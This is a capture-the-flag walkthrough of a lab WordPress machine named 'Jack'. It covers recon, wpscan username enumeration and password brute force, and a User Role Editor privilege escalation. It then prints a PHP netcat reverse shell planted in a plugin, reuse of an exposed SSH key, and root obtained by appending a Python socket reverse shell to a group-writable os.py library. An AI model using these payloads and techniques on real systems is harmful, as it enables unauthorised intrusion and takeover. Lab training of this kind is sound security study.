# recon
let start with and `jack.thm` to our `/etc/hosts` by runing `echo '$IP jack.tml' >> /etc/hosts`. now nmap !!

2 open ports:
- 22:ssh
- 80:http
then I gobuster for directory brute forcing using dirbuster big.txt. After I executed gobuster, I visit the web site and try to enumerate it in happy path way while gobuster is running.

I always start clicking around try to find use full info. At this point you should we have 1 username which is `jack` who posting stuff on his block. Thereafter I check `robots.txt`, why? why not lol. Always check for it, 
```
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
```
Muahahaha now we know that the blog is run by wordpress. there is a powerful tool call wpscan, read more about it [here](https://wpscan.org/).


The Idea is we will use wpscan to enumerate username and the we can brute force the password using wordlist on our kali. to enumerate username, run:
```console
kali@kali:~$ wpscan --url http://jack.thm --enumerate u
i] User(s) Identified:

[+] jack
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://jack.thm/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] wendy
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] danny
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

so we got 3 username...
- jack
- wendy
- danny
now let brute force to get password. we will not use *rockyou.txt* coz it is to huge. Note that we have 3 users which mean the time to crack the password will take triple longer coz each password will be send 3 times. 1 time to each user. so there is around 1m password in *rockyou.txt* -> 3m password to test. RIP then. 

The plan is we will use `/usr/share/wordlists/fasttrack.txt` instead and let hope that this works. otherwise we have 3m+ password to go thru.
```console
$ wpscan --url http://jack.thm --passwords /usr/share/wordlists/fasttrack.txt --usernames jack,wendy,danny
.
.
[+] Performing password attack on Xmlrpc against 3 user/s
[SUCCESS] - wendy / ch________                                                                        
Trying danny / starwars Time: 00:01:57 <===========================> (646 / 646) 100.00% Time: 00:01:57
.
```

BINGO ! we got the password, now visit /wp-admin/ and log into wordpress admin page. and let enumerate it a bit:

note that wendy are only a normalt user. After diging for some exloit, I found this 
[WordPress Plugin User Role Editor < 4.25 - Privilege Escalation](https://www.exploit-db.com/exploits/44595). try to understand it pls

now launch burp suite, go to profile and try to update ur proflie. capture the post request and add `$ure_other_roles=administrator` this will allow to escalate to admin user.


now wendy should have admin role. Note that there are plug in on the site. The plan is we will use plug in to spawn a reverse shell on the server.


# foot hold
select on of the plug in template that you want and add reverse shell in the php template:
```php
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash 2>&1|nc <kali ip> 6969 >/tmp/f") ?>
```
back to kali, execute netcat and wait for connection. now go back to the main plug in page an activate the plug in that you edited. you should get a reverse shell right aways


let spawn tty sheöö
```conole
python -c 'import pty; pty.spawn("/bin/sh")'
ls
reminder.txt  user.txt
$ cat user.txt
cat user.txt
$ cat reminder.txt
cat reminder.txt

Please read the memo on linux file permissions, last time your backups almost got us hacked! Jack will hear about this when he gets back.
```
seem like there is a clue here, let go check `/var/backups`
```console
$ cd /var/backups
cd /var/backups
$ ls -la
ls -la
total 776
drwxr-xr-x  2 root root     4096 Jan 10  2020 .
drwxr-xr-x 14 root root     4096 Jan  9  2020 ..
-rw-r--r--  1 root root    40960 Jan  9  2020 alternatives.tar.0
-rw-r--r--  1 root root     9931 Jan  9  2020 apt.extended_states.0
-rw-r--r--  1 root root      713 Jan  8  2020 apt.extended_states.1.gz
-rw-r--r--  1 root root       11 Jan  8  2020 dpkg.arch.0
-rw-r--r--  1 root root       43 Jan  8  2020 dpkg.arch.1.gz
-rw-r--r--  1 root root      437 Jan  8  2020 dpkg.diversions.0
-rw-r--r--  1 root root      202 Jan  8  2020 dpkg.diversions.1.gz
-rw-r--r--  1 root root      207 Jan  9  2020 dpkg.statoverride.0
-rw-r--r--  1 root root      129 Jan  8  2020 dpkg.statoverride.1.gz
-rw-r--r--  1 root root   552673 Jan  9  2020 dpkg.status.0
-rw-r--r--  1 root root   129487 Jan  8  2020 dpkg.status.1.gz
-rw-------  1 root root      802 Jan  9  2020 group.bak
-rw-------  1 root shadow    672 Jan  9  2020 gshadow.bak
-rwxrwxrwx  1 root root     1675 Jan 10  2020 id_rsa
-rw-------  1 root root     1626 Jan  9  2020 passwd.bak
-rw-------  1 root shadow    969 Jan  9  2020 shadow.bak
```
Bingo there is a id_rsa key here, I assume that is jack ssh key. let grap it and ssh to the victim server! and start enumerate more


# root
```console
jack@jack$ id
uid=1000(jack) gid=1000(jack) groups=1000(jack),4(adm),24(cdrom),30(dip),46(plugdev),115(lpadmin),116(sambashare),1001(family)
```
something worth notice here is jack is a member of family groub.


We will use a tool call `pspy` which allow us to see commands run by other users, cron jobs, etc. as they execute. for more info check this repo [pspy](https://github.com/DominicBreuker/pspy). if you dont have it, clone it and save it in a good place. You will need this script again in the future.


tranfer `pspy` to the victim server, execute it and wait.  here is what you should se
```
2020/08/06 18:18:01 CMD: UID=0    PID=2054   | /usr/bin/python /opt/statuscheck/checker.py 
2020/08/06 18:18:01 CMD: UID=0    PID=2053   | /bin/sh -c /usr/bin/python /opt/statuscheck/checker.py
```
after a while you will see that the server execute `/opt/statuscheck/checker.py` again and again. we can hijact the `checker.py` and use it to spawn our shell. But said ly we dont have premission to edit it. but let see what `checker.py` does
```console
jack@jack:~$ cat /opt/statuscheck/checker.py 
import os

os.system("/usr/bin/curl -s -I http://127.0.0.1 >> /opt/statuscheck/output.log")
```
okey as you can see here, it `import os` which is using a libary/module call os. we can can try to hijact the module instead ! let check if we have premission to edit it.
```console
jack@jack:~$ find / -name os.py 2> /dev/null
/usr/lib/python3.5/os.py
/usr/lib/python2.7/os.py
```
since `checker.py` is execute with python2.7, we are only intressed on `/usr/lib/python2.7/os.py`
```console
jack@jack:~$ ls -la /usr/lib/python2.7/os.py
-rw-rw-r-x 1 root family 25908 Jan 10  2020 /usr/lib/python2.7/os.py
```
BING GO! as we discussed, Jack is a member of family group and we have premission to read/write `os.py` now let as our reverse shell to the end of `os.py`

```py
import socket
import pty
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("kali ip",9008))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
pty.spawn("/bin/bash")
```
now on ur kali
```console
kali@kali:~/script$ nc -nlvp 9696
listening on [any] 9696 ...
connect to [10.11.14.220] from (UNKNOWN) [10.10.93.28] 40908
root@jack:~# ls
ls
root.txt
root@jack:~# cat root.txt
cat root.txt
````
